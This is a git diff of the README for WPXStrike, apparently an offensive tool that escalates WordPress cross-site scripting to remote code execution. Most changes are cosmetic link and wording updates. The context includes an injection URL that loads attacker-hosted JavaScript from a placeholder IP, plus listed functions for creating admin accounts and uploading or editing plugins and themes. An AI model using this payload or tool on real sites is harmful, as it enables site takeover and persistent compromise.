@@ -1,11 +1,13 @@
 
 <h1 align="center">
   <br>
-  <img src="https://github.com/nowak0x01/WPXStrike/assets/96009982/dac6cab2-15eb-4f6f-ae16-b219981bd978" alt="WPXStrike" width="350">
+  <img src="https://github.com/nowak0x01/WPXStrike/assets/96009982/36f99c00-31f9-45fa-ab4d-746481a16de4" alt="WPXStrike" width="350">
   <br>
   WPXStrike
   <br>
 </h1>
+
+
 
 <h4 align="center">WordPress Exploitation Script that elevate XSS to RCE or Others Critical Vulnerabilties</a>.</h4>
 
@@ -17,7 +19,7 @@
   <a href="#contributing">Contributing</a>
 </p>
 
-![screenshot](https://github.com/nowak0x01/WPXStrike/assets/96009982/6e2578ba-c4ee-46ee-9a4d-8d3f7e57024b)
+![screenshot](https://github.com/nowak0x01/WPXStrike/assets/96009982/c9cd4b27-e93d-4e90-bd69-b10c0fe36e60)
 
 ## About
 _**WPXStrike**_ is a script designed to escalate a **Cross-Site Scripting (XSS)** vulnerability to **Remote Code Execution (RCE)** or other's criticals vulnerabilities in WordPress.
@@ -36,7 +38,7 @@ _**WPXStrike**_ is a script designed to escalate a **Cross-Site Scripting (XSS)*
   - Custom Exploits for Third-Party WordPress Plugins/Themes.
   
 ## How To Use
-https://github.com/nowak0x01/WPXStrike/assets/96009982/6fb5e850-c3ee-46ab-a9c4-15ed446391ce
+https://github.com/nowak0x01/WPXStrike/assets/96009982/8b19e884-771f-4096-b1f0-9fd0fb13449d
 
 1\) Clone the Repository
 ```bash
@@ -84,19 +86,21 @@ https://example.com/wordpress/?search=<script src="//YOURIP/WPXStrike.js"></scri
 ## Examples
 **_WPCreateAccount()_ - Creates an user in WordPress.**
 
-https://github.com/nowak0x01/WPXStrike/assets/96009982/ac3e0f44-f684-41e5-a254-3f7b845f874d
+
+
+https://github.com/nowak0x01/WPXStrike/assets/96009982/f0e09621-a1c3-48a6-9d44-02acc865b78d
 
 **_WPUploadCustomPlugin()_ - Upload your custom plugin to WordPress.**
 
-https://github.com/nowak0x01/WPXStrike/assets/96009982/475c4116-8d56-4fcb-9d4f-94fcdfee9161
+https://github.com/nowak0x01/WPXStrike/assets/96009982/4ccf866d-2f05-4c9e-abd2-7e8f65c1dc65
 
 **_WPEditThemes()_ - Edit a Built-In Themes in WordPress.**
 
-https://github.com/nowak0x01/WPXStrike/assets/96009982/8fda1d80-8fd7-451a-a130-6da88f295756
+https://github.com/nowak0x01/WPXStrike/assets/96009982/2ad761e6-2480-4300-bc80-28ea7a8dc04a
 
-**_WPEditPlugins()_ = Edit a Built-In Plugins in WordPress.**
+**_WPEditPlugins()_ - Edit a Built-In Plugins in WordPress.**
 
-https://github.com/nowak0x01/WPXStrike/assets/96009982/b2796b1a-5431-4ef4-ac73-aa6b6799dad4
+https://github.com/nowak0x01/WPXStrike/assets/96009982/205534b3-b41f-4971-bd78-c346c7c774e5
 
 **_CustomExploits()_ - Custom Exploits for Third-Party WordPress Plugins/Themes**.<br>
 // pending
@@ -104,4 +108,4 @@ https://github.com/nowak0x01/WPXStrike/assets/96009982/b2796b1a-5431-4ef4-ac73-a
 # Contributing
 Pull requests are more than welcome.<br>
 I will try to maintain this project updated, whenever possible by adding new exploits in the `CustomExploits()` module.<br>
-If u want to contribute with this, adding new `CustomExploits()` or improving the code, I'll be very grateful.
+If u want to contribute with this, adding new exploit functions to `CustomExploits()` or improving the code, I'll be very grateful.
